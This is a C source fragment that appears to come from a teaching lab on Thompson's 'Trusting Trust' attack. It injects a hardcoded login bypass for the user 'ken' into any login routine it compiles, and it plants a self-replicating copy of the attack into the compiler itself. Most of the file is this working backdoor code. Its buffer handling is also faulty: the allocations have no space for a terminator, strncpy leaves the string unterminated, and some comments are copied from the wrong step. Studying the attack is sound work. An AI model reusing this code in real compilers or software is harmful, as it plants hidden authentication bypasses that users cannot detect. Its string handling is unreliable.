//need newline gap
#ifdef dogs
#include "attack-array.h"

#endif
/*****************************************************************
     * Step 1:
     */
 
    // match on the start of the login() routine:
    static char login_sig[] = "int login(char *user) {";

    // and inject an attack for "ken":
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

	char *login = strstr(program, login_sig); // found where login sig starts, if it does
    if (login != NULL) {
		//initalize new program string to hold original program plus our attack
		char *new_program = malloc(sizeof(char) * (strlen(program) + strlen(login_attack)));
		assert (new_program != NULL);
		
		//copy up to the login signature into new program
		strncpy(new_program, program, login - program);
		//copy in the login signature itself
		strncat(new_program, login_sig, strlen(login_sig));
		//copy attack in
		strncat(new_program, login_attack, strlen(login_attack));
		//copy in rest of the program unchanged
		strcat(new_program, login + strlen(login_sig));

		fprintf(fp, "%s", new_program);
		fclose(fp);
		free(new_program);
	}


	
    /*****************************************************************
     * Step 2:
     */

    // search for the start of the compile routine: 
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;



	//put the compile attack into the compiler
	char *compile = strstr(program, compile_sig); // found where login sig starts, if it does
    if (compile != NULL) {
		//initalize new program string to hold original program plus our attack
		char *new_program = malloc(sizeof(char) * (strlen(program) + strlen(prog)));
		assert (new_program != NULL);
		fprintf(fp, "char prog[] = {\n");
		for(unsigned i = 0; prog[i]; i++) {
			fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
		}
		fprintf(fp, "0 };\n");
		//copy up to the login signature into new program
		strncpy(new_program, program, compile - program);
		//copy in the login signature itself
		strncat(new_program, compile_sig, strlen(compile_sig));
		//copy attack in
		strncat(new_program, prog, strlen(prog));
		//copy in rest of the program unchanged
		strcat(new_program, compile + strlen(compile_sig));

		fprintf(fp, "%s", new_program);
    	fclose(fp);
		free(new_program);
	} else {
		//not compiler program
		fprintf(fp, "%s", program);
    	fclose(fp);
	}